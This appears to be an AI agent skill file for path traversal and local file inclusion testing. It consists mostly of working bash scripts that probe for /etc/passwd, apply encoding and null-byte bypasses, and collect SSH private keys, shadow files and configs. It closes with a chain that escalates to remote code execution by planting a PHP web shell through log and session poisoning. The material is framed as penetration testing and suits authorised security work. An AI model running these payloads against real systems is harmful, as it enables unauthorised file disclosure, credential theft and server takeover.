---
name: vuln-path-traversal
description: "Path traversal / directory traversal / LFI testing — ../../../etc/passwd, URL encoding bypass, null byte bypass, filter bypass with encoding, absolute path injection, path normalization bypass. Triggers: 'path traversal', 'directory traversal', 'lfi', 'local file inclusion', '../etc/passwd', 'file read', 'path injection', 'dot dot slash', 'traversal bypass', 'file disclosure'."
---

# Path Traversal / LFI Testing

Bypass path restrictions to read arbitrary files on the server.

---

## Phase 1: Detection

```bash
TARGET="https://TARGET"
PARAM="file"  # adjust to actual param

# Basic traversal probes:
TARGETS=("/etc/passwd" "/etc/shadow" "/etc/hosts" "/proc/self/environ" "/proc/version" "C:/Windows/win.ini" "C:/Windows/System32/drivers/etc/hosts")

for FILE in "${TARGETS[@]}"; do
  for TRAVERSAL in "../../../${FILE#/}" "../../../../${FILE#/}" "../../../../../${FILE#/}" "${FILE}"; do
    RESP=$(curl -s "$TARGET/download?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$TRAVERSAL'))")")
    if echo "$RESP" | grep -qE 'root:|daemon:|nobody:|localhost|127.0.0.1|\[boot loader\]'; then
      echo "VULNERABLE: $TRAVERSAL"
      echo "$RESP" | head -5
      break
    fi
  done
done | tee output/traversal_detect.txt
```

---

## Phase 2: Bypass Techniques

```bash
TARGET="https://TARGET"
PARAM="file"

# URL encoding bypass:
# ../../../etc/passwd → %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
curl -s "$TARGET/download?$PARAM=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Double URL encoding:
# ../ → %252e%252e%252f
curl -s "$TARGET/download?$PARAM=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"

# Unicode encoding:
curl -s "$TARGET/download?$PARAM=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
curl -s "$TARGET/download?$PARAM=..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd"

# Null byte bypass (PHP < 5.3):
curl -s "$TARGET/download?$PARAM=../../../etc/passwd%00.jpg"

# Filter bypass via strip:
# If ../  is stripped: ....// → ../ after strip
curl -s "$TARGET/download?$PARAM=....//....//....//etc/passwd"

# Absolute path (if no restriction):
curl -s "$TARGET/download?$PARAM=/etc/passwd"

# Path normalization bypass:
curl -s "$TARGET/download?$PARAM=/safe_dir/../../../etc/passwd"

# Automated scan:
ffuf -u "$TARGET/download?$PARAM=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
  -mc 200 -fs 0 -o output/lfi_ffuf.json 2>&1
```

---

## Phase 3: Sensitive File Targets

```bash
TARGET="https://TARGET"
PARAM="file"
BASE="../../../.."  # adjust depth

# Linux targets:
FILES=(
  "$BASE/etc/passwd"
  "$BASE/etc/shadow"
  "$BASE/etc/ssh/sshd_config"
  "$BASE/home/ubuntu/.ssh/id_rsa"
  "$BASE/root/.ssh/id_rsa"
  "$BASE/proc/self/environ"
  "$BASE/proc/self/cmdline"
  "$BASE/proc/self/maps"
  "$BASE/var/log/apache2/access.log"
  "$BASE/var/log/nginx/access.log"
  "$BASE/etc/nginx/nginx.conf"
  "$BASE/etc/apache2/apache2.conf"
)

for FILE in "${FILES[@]}"; do
  RESP=$(curl -s "$TARGET/file?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$FILE'))")")
  [ ${#RESP} -gt 100 ] && echo "FOUND: $FILE | $(echo $RESP | head -c 80)"
done | tee output/traversal_files.txt
```

---

## Phase 4: LFI to RCE

```bash
TARGET="https://TARGET"

# Log poisoning — inject PHP via User-Agent into access log:
curl -s "$TARGET/" -A "<?php system(\$_GET['cmd']); ?>"
# Then include log:
curl -s "$TARGET/include?file=../../../var/log/apache2/access.log&cmd=id"

# PHP session poisoning:
curl -s "$TARGET/login" -d "user=<?php system(\$_GET['cmd']); ?>" -c /tmp/cookies.txt
SESS_ID=$(grep PHPSESSID /tmp/cookies.txt | awk '{print $7}')
curl -s "$TARGET/include?file=../../../tmp/sess_${SESS_ID}&cmd=id"

# /proc/self/environ:
curl -s "$TARGET/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
curl -s "$TARGET/include?file=../../../proc/self/environ&cmd=id"
```

---

## Output

Save to `output/`:
- `traversal_detect.txt` — successful traversal payloads
- `traversal_files.txt` — sensitive files read
- `lfi_ffuf.json` — automated scan results

## Next Phase

→ `vuln-rce` for LFI-to-RCE chaining
→ `pentest-report` for findings documentation
